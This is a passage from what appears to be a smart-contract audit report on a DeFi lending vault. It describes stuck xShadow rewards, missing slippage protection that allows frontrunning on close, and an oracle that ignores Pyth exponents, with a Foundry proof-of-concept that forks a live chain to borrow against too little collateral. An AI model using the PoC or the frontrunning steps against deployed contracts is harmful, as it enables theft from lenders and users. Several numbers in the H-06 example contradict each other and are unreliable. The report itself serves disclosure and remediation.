The `ShadowRangeVault::claimRewards` function can be called by anyone:

```solidity
function claimRewards(uint256 positionId) external nonReentrant {
        IShadowRangePositionImpl(positionInfos[positionId].positionAddress).claimRewards();

        require(getDebtRatio(positionId) < liquidationDebtRatio, "Debt ratio is too high");
    }
```

This function then calls `claimRewards` on the `ShadowRangePositionImpl` contract:

```solidity
function claimRewards() external onlyVault {
    _claimFees();
    _claimRewards();              // <-- vulnerable
}
```

Inside `ShadowRangeVault::_claimRewards`, the handling of `xShadow` only happens if the epoch is unlocked:

```solidity
function _claimRewards() internal {
    address[] memory tokens = IShadowGaugeV3(gauge).getRewardTokens();
    IShadowGaugeV3(gauge).getReward(shadowPositionId, tokens);   // transfers rewards in

    for (uint256 i; i < tokens.length; i++) {
        uint256 bal = IERC20(tokens[i]).balanceOf(address(this));
        if (bal == 0) continue;

        if (tokens[i] == xShadow) {                 // special-case branch
            if (IShadowX33(x33).isUnlocked()) {     // ONLY when epoch is “unlocked”
                address adapter = getX33Adapter();
                IERC20(tokens[i]).approve(adapter, bal);
                IERC4626(adapter).deposit(bal, address(this));
                uint256 x33Bal = IERC20(x33).balanceOf(address(this));
                IERC20(x33).approve(vault, x33Bal);
                IVault(vault).claimCallback(x33, x33Bal);
            }
            // ───────── NO else branch ─────────
        } else {
            IERC20(tokens[i]).approve(vault, bal);
            IVault(vault).claimCallback(tokens[i], bal);
        }
    }
}
```

If the epoch is locked, the code does nothing with the `xShadow tokens`, they remain inside the `proxy` without emitting an event or updating any state. No `fallback` or `else` code exists.

Later, if `ShadowRangePositionImpl::closePosition` is called during the same locked epoch:

```solidity
function closePosition() external onlyVault {
    _claimFees();
    _claimRewards();                       // xShadow skipped again if locked
    // … unwind liquidity, repay debts …
    pay(token0,…);  pay(token1,…);        // only LP tokens are forwarded
}                                          // other ERC-20 balances are ignored
```

At this point:

- The `xShadow` tokens are still stuck inside the `proxy`.
- `ShadowRangeVault::getPositionValue` becomes 0.
- All future `ShadowRangeVault::claimRewards` calls revert due to a division by zero in the debt ratio check.
- All `external functions` on the proxy are `onlyVault`, so users cannot recover the stuck tokens even through governance or rescue functions.

This flow permanently locks user rewards.

### Impact Explanation

This causes a full loss of the user's `xShadow` rewards if they claim during a locked epoch and later close or upgrade the position before the epoch unlocks. Since `ShadowRangeVault::claimRewards` is `external`, anyone can trigger this loss for any user.

### Likelihood Explanation

The likelihood for this to occur is high. Locked epochs are part of normal protocol operation. Users can call `ShadowRangeVault::claimRewards` during this time without knowing the consequences or it can be called by attackers. Closing positions is also a normal routine action.

### Recommendation

Handle the locked `xShadow` balance properly. Either:

- Store it for later processing once the epoch unlocks, or
- Revert the claim if `xShadow` is present but cannot be processed.


















## <a id='H-05'></a>H-05. No Slippage Protection in `ShadowRangeVault::closePosition` Lets Attackers Steal Collateral

### Summary

The `ShadowRangePositionImpl::closePosition` function performs swaps and removes liquidity in `ShadowRangePositionImpl::_decreasePosition` without any slippage controls. Attackers can frontrun the function to steal most of the victim `collateral`.

### Finding Description

When a position is closed, the contract removes liquidity and repays debt, but Liquidity is removed with no minimum amounts:

```solidity
// ShadowRangePositionImpl.sol
function _decreasePosition(uint128 liquidity) internal returns (uint256 amount0, uint256 amount1) {
        IShadowNonfungiblePositionManager(getShadowNonfungiblePositionManager()).decreaseLiquidity(
            IShadowNonfungiblePositionManager.DecreaseLiquidityParams({
                tokenId: shadowPositionId,
                liquidity: liquidity,
                amount0Min: 0, // <-- no protection
                amount1Min: 0, // <-- no protection
                deadline: block.timestamp
            })
        );
}
```

This means the vault will accept any mix of `token0/token1`, even if one side is almost zero.

After that, debt must be repaid immediately:

```solidity
// ShadowRangePositionImpl::closePosition
if (currentDebt0 > token0Reduced) {
    _swapTokenExactInput(token1, token0, token1Excess, currentDebt0 - token0Reduced);
}
if (currentDebt1 > token1Reduced) {
    _swapTokenExactInput(token0, token1, token0Excess, currentDebt1 - token1Reduced);
}
```

The `ShadowRangePositionImpl::_swapTokenExactInput` function swaps have no price limits:

```solidity
function _swapTokenExactInput(
    address tokenIn, address tokenOut,
    uint256 amountIn, uint256 amountOutMinimum
) internal returns (uint256) {
    amountOut = IShadowSwapRouter(router).exactInputSingle(
        IShadowSwapRouter.ExactInputSingleParams({
            tokenIn: tokenIn,
            tokenOut: tokenOut,
            tickSpacing: tickSpacing,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: amountIn,
            amountOutMinimum: amountOutMinimum,   // only tiny deficit
            sqrtPriceLimitX96: 0                  // <-- **no price-limit**
        })
    );
}

```

Because `sqrtPriceLimitX96` is set to 0, the swap will go through at any price, even if the attacker just manipulated the pool.

In `ShadowRangeVault::closePosition` function, users cannot set slippage or protect themselves:

```solidity
function closePosition(uint256 positionId)
        external
        nonReentrant
        returns (uint256 token0Balance, uint256 token1Balance)
    {
        PositionInfo memory positionInfo = positionInfos[positionId];
        require(positionInfo.owner == msg.sender, "NO");
        require(getDebtRatio(positionId) < liquidationDebtRatio, "DRH");
        (token0Balance, token1Balance) = _closePosition(positionId); // <-- no user input for slippage
    }
```

Everything happens in one transaction. There are no slippage checks, no TWAP limits, and no way for the user to cancel or control the price.

### Impact Explanation

An attacker can watch the mempool, push the pool price just before the user `ShadowRangeVault::closePosition` confirms, and force the vault to close at a bad price:

- The liquidity is removed in a bad token mix.
- The swap pays too much of one token to get enough of the other.
- The attacker resets the price and keeps the difference.

This lets the attacker drain most of the user’s remaining value in the position.

### Likelihood Explanation

Users cannot defend against this as there are no limits in place, and closing positions is a routine part of vault use. Attackers only need to watch the mempool and frontrun the call.

### Recommendation

Add slippage controls and price limits to both the liquidity removal and the swap:

- Use a`mount0Min` and `amount1Min` when calling `decreaseLiquidity`.
- Add slippage or TWAP checks to the swap logic.
- Let the caller pass in slippage tolerance or add safe defaults in `ShadowRangeVault::closePosition`.
















## <a id='H-06'></a>H-06. Vault Misinterprets Price Oracle Scale, Letting Attackers Borrow 100× More Than Allowed

### Summary

The `ShadowRangeVault` relies on `PrimaryPriceOracle` which fetches prices from Pyth feeds. However, the oracle ignores Pyth `expo`, which determines the actual scale of the price (e.g. 10⁻⁸ or 10⁻⁶). By treating all prices as if they were scaled to `10⁰`, the vault calculates incorrect USD values for tokens.

This discrepancy underestimates borrowed token value and overestimates collateral, allowing attackers to borrow more than permitted.

### Finding Description

1. Oracle drops price exponent `(expo)`

```solidity
// PrimaryPriceOracle.sol
PythStructs.Price memory priceStruct = pyth.getPriceUnsafe(priceId);
uint256 price = uint256(uint64(priceStruct.price));  // expo is silently ignored
return price;
```

Pyth feeds return `(price, expo)` which must be interpreted as `realPrice = price × 10^expo;`

By dropping expo, a USDC feed with `expo = -6` and an ETH feed with `expo = -8` get treated as if they're on the same scale, inflating ETH USD value by 100×.

2. `ShadowRangeVault` consumes raw prices without verifying scale as seen in functions like `ShadowRangeVault::getPositionValue`, etc.

```solidity
// ShadowRangeVault.sol
uint256 value = tokenAmount * getTokenPrice(token) / 10**tokenDecimals;
```

While the vault divides by the ERC-20 decimals (e.g., 18 for ETH, 6 for USDC), this doesn't correct the wrong price scale and so the oracle scale is wrong, so the value is miscalculated.

3. Vault uses those incorrect values to compute debt ratio

```solidity
// ShadowRangeVault.sol
function getDebtRatioFromAmounts(
        uint256 amount0Principal,
        uint256 amount1Principal,
        uint256 amount0Borrow,
        uint256 amount1Borrow
    ) public view returns (uint256 debtRatio) {
        uint256 principalValue = amount0Principal * getTokenPrice(token0) / 10 ** token0Decimals
            + amount1Principal * getTokenPrice(token1) / 10 ** token1Decimals;
        uint256 borrowValue = amount0Borrow * getTokenPrice(token0) / 10 ** token0Decimals
            + amount1Borrow * getTokenPrice(token1) / 10 ** token1Decimals;
        return borrowValue * 10000 / (principalValue + borrowValue); // must be < 8600
    }
```

If the vault thinks ETH price is $150 (should be $1,500) and USDC is $1 (correct), then:
- `borrowValue` (in USDC) becomes 100× too small
- `debtRatio` 100× too small
- `vault` allows 100× more borrowing

Result: the calculated `debtRatio` appears harmless, but the actual debt is massively undercollateralised, which means the value of the collateral (what you lock up) is too low compared to the value of the loan (what you borrow).

### Impact Explanation

Here’s an end-to-end example of the exploit as shown also in the below PoC:

```solidity
// Attacker deposits 1 ETH (real: $1,500, vault thinks: $150 B)
// Borrows 99,000 USDC (real: $99,000, vault thinks: $0.99 M)

Expected debt ratio = 98.5%  // Vault should reject or liquidate
Calculated debt ratio = 66% (below 86% threshold)  // Vault accepts without suspicion
```

This gives attackers 10x to 100x leverage, and they can drain the lending pool with a few such positions.

### Likelihood Explanation

This bug affects the whole system and there are no checks to catch it. As long as tokens with different Pyth expo are used, anyone can take advantage of it just by opening a position with those tokens.

### Proof Of Code (PoC)

<details>
<summary>Code</summary>

For the PoC, we are going to simulate a ETH price. Create a folder called test under contracts, then create a Shadow.t.sol file under test folder, paste the following test into the file, run poc with `forge test --mt test_Exploit_UnderCollateralized -vv`

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import "../shadow/ShadowRangeVault.sol";
import "../shadow/ShadowRangePositionImpl.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {AddressRegistry} from "../AddressRegistry.sol";
import {VaultRegistry} from "../VaultRegistry.sol";
import {IVault} from "../interfaces/IVault.sol";
import {LendingPool} from "../lendingpool/LendingPool.sol";
import {ShadowPositionValueCalculator} from "../shadow/ShadowPositionValueCalculator.sol";

import {IShadowNonfungiblePositionManager} from "../interfaces/IShadowNonfungiblePositionManager.sol";
import {IShadowV3Pool} from "../interfaces/IShadowV3Pool.sol";
import {IShadowSwapRouter} from "../interfaces/IShadowSwapRouter.sol";

contract MockPriceOracle is IPriceOracle {
    mapping(address => uint256) public prices;

    function setTokenPrice(address token, uint256 price) external {
        prices[token] = price;
    }

    function getTokenPrice(
        address token
    ) public view override returns (uint256) {
        return prices[token];
    }
}

contract ShadowRange is Test {
    address public constant TREASURY = address(0x1);
    IERC20 token0;
    IERC20 token1;

    VaultRegistry vaultRegistry;
    AddressRegistry registry;
    ShadowRangeVault vault;
    ShadowRangePositionImpl positionImpl;

    IShadowNonfungiblePositionManager shadowNonfungiblePositionManager;
    IShadowV3Pool shadowV3Pool;
    IShadowSwapRouter shadowSwapRouter;

    LendingPool public lendingPool;
    MockPriceOracle priceOracle;
    ShadowPositionValueCalculator valueCalculator;

    address attacker = address(0xdead);
    address lender1 = address(0x1337);
    address lender2 = address(0x1338);

    uint256 public token0ReserveId;
    uint256 public token1ReserveId;
    address public token0Address;
    address public token1Address;
    address public stakingToken0Address;
    address public stakingToken1Address;
    uint256 public initialDepositAmount = 1000 ether;

    address constant WETH9 = 0x039e2fB66102314Ce7b64Ce5Ce3E5183bc94aD38;
    address constant EGGS = 0xf26Ff70573ddc8a90Bd7865AF8d7d70B8Ff019bC;
    address constant USDC = 0x29219dd400f2Bf60E5a23d13Be72B486D4038894;
    address constant ShadowNonFungible =
        0x12E66C8F215DdD5d48d150c8f46aD0c6fB0F4406;
    address constant ShadowPool = 0x324963c267C354c7660Ce8CA3F5f167E05649970;
    address constant ShadowRouter = 0x5543c6176FEb9B4b179078205d7C29EEa2e2d695;

    address constant UNI_ROUTER = 0x2626664c2603336E57B271c5C0b26F421741e481;

    string rpcUrl = "https://rpc.soniclabs.com";
    uint24 tickSpacing = 50;

    function setUp() public {
        vm.createSelectFork(rpcUrl, 21039807);
        token0 = IERC20(WETH9);
        token1 = IERC20(USDC);

        shadowNonfungiblePositionManager = IShadowNonfungiblePositionManager(
            ShadowNonFungible
        );
        shadowV3Pool = IShadowV3Pool(ShadowPool);
        shadowSwapRouter = IShadowSwapRouter(ShadowRouter);

        // mockRouter = new MockShadowSwapRouter();
        registry = new AddressRegistry(address(EGGS));
        vaultRegistry = new VaultRegistry(address(registry));
        positionImpl = new ShadowRangePositionImpl();
        priceOracle = new MockPriceOracle();
        valueCalculator = new ShadowPositionValueCalculator();

        registry.setAddress(AddressId.ADDRESS_ID_TREASURY, TREASURY);
        registry.setAddress(
            AddressId.ADDRESS_ID_SHADOW_NONFUNGIBLE_POSITION_MANAGER,
            address(shadowNonfungiblePositionManager)
        );
        registry.setAddress(
            AddressId.ADDRESS_ID_SHADOW_ROUTER,
            address(shadowSwapRouter)
        );
        registry.setAddress(
            AddressId.ADDRESS_ID_SHADOW_POSITION_VALUE_CALCULATOR,
            address(valueCalculator)
        );

        lendingPool = new LendingPool();
        lendingPool.initialize(address(registry), address(EGGS));

        // Initialize reserves
        token0ReserveId = 1; // First reserve will have ID 1
        lendingPool.initReserve(address(token0));

        token1ReserveId = 2; // Second reserve will have ID 2
        lendingPool.initReserve(address(token1));

        vault = new ShadowRangeVault();
        vault.initialize(
            address(registry),
            address(vaultRegistry),
            address(shadowV3Pool),
            address(positionImpl)
        );

        // Get eToken addresses
        token0Address = lendingPool.getETokenAddress(token0ReserveId);
        token1Address = lendingPool.getETokenAddress(token1ReserveId);

        // Get staking addresses
        stakingToken0Address = lendingPool.getStakingAddress(token0ReserveId);
        stakingToken1Address = lendingPool.getStakingAddress(token1ReserveId);

        // Set price oracle
        registry.setAddress(
            AddressId.ADDRESS_ID_PRICE_ORACLE,
            address(priceOracle)
        );
        registry.setAddress(
            AddressId.ADDRESS_ID_VAULT_FACTORY,
            address(vaultRegistry)
        );
        registry.setAddress(
            AddressId.ADDRESS_ID_LENDING_POOL,
            address(lendingPool)
        );
        vaultRegistry.newVault(address(vault));

        vault.setReserveIds(token0ReserveId, token1ReserveId);

        priceOracle.setTokenPrice(address(token0), 0.5 ether);
        priceOracle.setTokenPrice(address(token1), 1 ether);

        deal(address(token0), attacker, 100 ether);
        deal(address(token1), attacker, 100 ether);

        vm.label(attacker, "Attacker");
        vm.label(lender1, "lender1");
        vm.label(lender2, "lender2");

        deal(address(token0), lender1, 1_000_000 ether);
        deal(address(token1), lender1, 1_000_000 ether);
        deal(address(token0), lender2, 1_000_000 ether);
        deal(address(token1), lender2, 1_000_000 ether);
    }
    
    function test_Exploit_UnderCollateralized() public {
    // Assume real price: ETH = $1500, USDC = $1
    // But price oracle ignores expo and treats both as 10^0 scale
    priceOracle.setTokenPrice(address(token0), 1500 * 1e8); // ETH
    priceOracle.setTokenPrice(address(token1), 1 * 1e6);     // USDC

    uint256 token1LendersAmount = 1_000_000e6;
    // Setup initial liquidity in lending pool
    vm.startPrank(lender1);
    token0.approve(address(lendingPool), initialDepositAmount);
    token1.approve(address(lendingPool), token1LendersAmount);
    lendingPool.depositAndStake(token0ReserveId, initialDepositAmount, lender1, 0);
    lendingPool.depositAndStake(token1ReserveId, token1LendersAmount, lender1, 0);
    vm.stopPrank();

    vm.startPrank(lender2);
    token0.approve(address(lendingPool), initialDepositAmount);
    token1.approve(address(lendingPool), token1LendersAmount);
    lendingPool.depositAndStake(token0ReserveId, initialDepositAmount, lender2, 0);
    lendingPool.depositAndStake(token1ReserveId, token1LendersAmount, lender2, 0);
    vm.stopPrank();

    // owner sets up permissions
    // Enable vault borrowing and set credit limits
    vm.startPrank(address(lendingPool.owner()));
    lendingPool.enableVaultToBorrow(vault.vaultId());
    lendingPool.setCreditsOfVault(vault.vaultId(), token0ReserveId, 1_000_000 ether);
    lendingPool.setCreditsOfVault(vault.vaultId(), token1ReserveId, 1_000_000 ether);
    vm.stopPrank();

    // Attacker: 1 ETH deposit, borrow 99_000 USDC
    IVault.OpenPositionParams memory params = IVault.OpenPositionParams({
        amount0Principal: 1 ether,
        amount1Principal: 0,
        amount0Borrow: 0,
        amount1Borrow: 99_000e6,
        amount0SwapNeededForPosition: 0,
        amount1SwapNeededForPosition: 0,
        amount0Desired: 1 ether,
        amount1Desired: 1_500e6,
        deadline: block.timestamp + 10,
        tickLower: -283950,
        tickUpper: -283900,
        ul: 0,
        ll: 0
    });

    vm.startPrank(attacker);
    token0.approve(address(vault), 1_000_000 ether);
    token1.approve(address(vault), 1_000_000 ether);
    vault.openPosition(params);
    vm.stopPrank();

    uint256 positionId = vault.nextPositionID() - 1;
    uint256 debtRatio = vault.getDebtRatio(positionId);
    console2.log("Debt ratio:", debtRatio); // This is 66% due to mis-scaled prices
    assertLt(debtRatio, vault.liquidationDebtRatio()); // This passes despite huge undercollateralization
}
}
```
</details>

### Recommendation

- Update `PrimaryPriceOracle.sol` to normalize Pyth prices by applying the exponent.